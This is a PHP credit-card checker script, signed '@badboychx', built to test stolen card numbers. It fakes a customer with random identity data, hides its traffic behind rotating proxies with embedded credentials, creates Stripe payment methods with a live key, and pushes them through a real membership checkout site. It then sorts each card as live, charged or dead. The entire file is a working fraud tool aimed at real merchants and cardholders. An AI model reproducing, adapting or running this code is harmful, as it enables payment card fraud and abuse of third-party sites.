<?php

#---------------------------------------------------[MADE BY @badboychx]----------------------------------------------------#
  
  
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$idd = '322580920';
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'bbpkrcdp-rotate:7thyu1oip98d',
);
$rotate = $rp1[array_rand($rp1)];

$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_PROXY => 'http://p.webshare.io:80',
    CURLOPT_PROXYUSERPWD => $rotate,
    CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
    $ip = "🟢";
}
if (empty($ip1)){
    $ip = "❌";
}
echo '[ IP: '.$ip.' ] ';

///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------



////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f760b15e-bab4-4824-9c74-73ad9684fe6bc93c7d&muid=4b846e88-7b32-4993-b88d-b0b2e7b561a3b59eee&sid=561c9b66-3a0b-4143-b2ee-b4786282bb0e9ded46&pasted_fields=number&payment_user_agent=stripe.js%2Fffa8518dde%3B+stripe-js-v3%2Fffa8518dde%3B+split-card-element&time_on_page=38791&key=pk_live_VwVhcqxB2mJal9kbNAugjzX0');

$result1 = curl_exec($ch);
  $l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));
  $crt = trim(strip_tags(getStr($result1,'"created": "','"')));
  $brnd = trim(strip_tags(getStr($result1,'"brand": "','"')));
$id = trim(strip_tags(getStr($result1,'"id": "','"')));


////////////////////////////===[2 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.wellnessmadesimple.us/membership-account/membership-checkout/?level=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /membership-account/membership-checkout/?level=1 h2',
'Host: www.wellnessmadesimple.us',
'origin: https://www.wellnessmadesimple.us',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with: com.xbrowser.play',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://www.wellnessmadesimple.us/membership-account/membership-checkout/?level=1',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
'cookie: PHPSESSID=8219nn1km10rihiuu5m24kep4d',
'cookie: pmpro_visit=1',
'cookie: __stripe_mid=4b846e88-7b32-4993-b88d-b0b2e7b561a3b59eee',
'cookie: _gid=GA1.2.1886512647.1692947466',
'cookie: sucuri_cloudproxy_uuid_315a59e28=133f6dc2230c602d43b39ebab2582066',
'cookie: wordpress_test_cookie=WP%20Cookie%20check',
'cookie: sucuri_cloudproxy_uuid_45170fb3d=a1f2f3f4c192124d0ede2ac71d3e0786',
'cookie: __stripe_sid=561c9b66-3a0b-4143-b2ee-b4786282bb0e9ded46',
'cookie: _ga_YJLE6GE62T=GS1.1.1692947482.2.1.1692947786.0.0.0',
'cookie: _ga=GA1.2.556039640.1692715368',
'cookie: _ga_YCTQZK3MHL=GS1.1.1692947458.2.1.1692947815.0.0.0',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&other_discount_code=&username=Wilsonc'.$lastname.'&password=12345678&password2=12345678&bemail=wilson'.$lastname.'%40gmail.com&bconfirmemail_copy=1&fullname=&CardType='.$brand.'&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$l4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');

 $result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
$info = curl_getinfo($ch);
$time = $info['total_time'];



/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


if(strpos($fim, '"type":"credit"') !== false) {
    $type = 'Credit';
  } else {
    $type = 'Debit';
  }
  if
  (strpos($result2,  '"cvc_check": "pass"')) {
    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CVV LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "Thank you. Your order has been received.")) {
    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  elseif
  (strpos($result2,  'result":"OK')) {
    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "Thank You.")) {
    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'Your card zip code is incorrect.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  } 
  elseif
  (strpos($result2,  '/donations/thank_you?donation_number=','')) {
    echo "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span> ¤ <span class='text-primary'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "incorrect_zip")) {
    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  '"type":"one-time"')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[APPROVED CVV]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'security code is incorrect.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'security code is invalid.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INVALID CVC]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'Your card&#039;s security code is incorrect.')) {
    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "incorrect_cvc")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->CCN LIVE]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  elseif
  (strpos($result2,  'Your card has insufficient funds.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result2,  "insufficient_funds")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  '"cvc_check": "fail"')) {
    echo  "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'security code is invalid.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'Your card&#039;s security code is incorrect.')) {
    echo"CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "incorrect_cvc")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[CCN LIVE]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result2,  'Your card has insufficient funds.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result2,  "insufficient_funds")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[INSUFFICIENT FUNDS]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'Your card has expired.')) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card has expired.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'Your card number is incorrect.')) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card number is incorrect.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  elseif
  (strpos($result2,  "incorrect_number")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[incorrect_number]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  'card was declined.')) {
     echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "do_not_honor")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "do_not_honor")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[do_not_honor]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result2,  'Your card does not support this type of purchase.')) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[Your card does not support this type of purchase.]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  
  elseif
  (strpos($result2,  "transaction_not_allowed")) {
    echo "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-success'> MSG->[transaction_not_allowed]</spat> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  elseif
  (strpos($result2,  'card was declined.')) {
    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  elseif
  (strpos($result2,  "generic_decline")) {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[generic_decline]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  
  
  
  elseif 
  (strpos($result2,  '-1')) {
    echo  "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[UPDATE NONCE ]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
  else {
    echo "DEAD<b><span class='text-danger'></span> <span class='text-danger'>$lista</b></span> ¤ <span class='text-danger'>[0.6$]</span><span class='text-dark'>[CARD TYPE-> $type]<br></span><span class='text-danger'> MSG->[Your card was declined.{due to unknoen earror}]</span> -> <span class='text-danger'></span> -> <span class='text-dark'> BANK:- $bank </span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
  }
  
        
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

///echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";


?>